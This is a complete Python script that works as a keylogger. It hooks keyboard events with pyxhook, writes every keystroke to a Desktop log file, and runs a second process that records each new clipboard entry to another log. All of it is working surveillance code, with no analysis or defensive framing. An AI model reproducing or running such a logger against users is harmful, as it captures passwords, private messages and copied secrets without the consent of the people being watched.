#!/usr/bin/python3

try:
	import pyxhook, pyperclip
except:
	print('Please install pyxhook and pyperclip packages!')
	exit(0)

import os
import time
import datetime
import multiprocessing


log_key_file = os.environ.get(
	'zero-key-score-key',
	os.path.expanduser('~/Desktop/file_key.log')
)

log_clip_file = os.environ.get(
	'zero-key-score-clip',
	os.path.expanduser('~/Desktop/file_clip.log')
)


def WriteToFile(filename, msg):
	with open(filename, 'a') as f:
		f.write('{}\n'.format(msg))


def OnKeyPress(event):
	WriteToFile(log_key_file, event.Key)


def listen_key():
	hook = pyxhook.HookManager()
	hook.KeyDown = OnKeyPress
	hook.HookKeyboard()
	try:
		hook.start()
	except Exception as e:
		msg = 'Error while catching events:\n {}'.format(e)
		WriteToFile(log_key_file, msg)


def listen_clip():
	content = ''
	while True:
		new_content = pyperclip.paste().strip()
		if content != new_content:
			WriteToFile(log_clip_file, new_content)
			content = new_content
		time.sleep(1)


if __name__ == '__main__':
	timestamp = "Timestamp: " + str(datetime.datetime.now())
	WriteToFile(log_key_file, timestamp)
	WriteToFile(log_clip_file, timestamp)

	p1 = multiprocessing.Process(target=listen_key)
	p2 = multiprocessing.Process(target=listen_clip)

	p1.start()
	p2.start()

#	This never happens because both processes are infinite
	p1.join()
	p2.join()

	print('This doesn\'t print probably!')
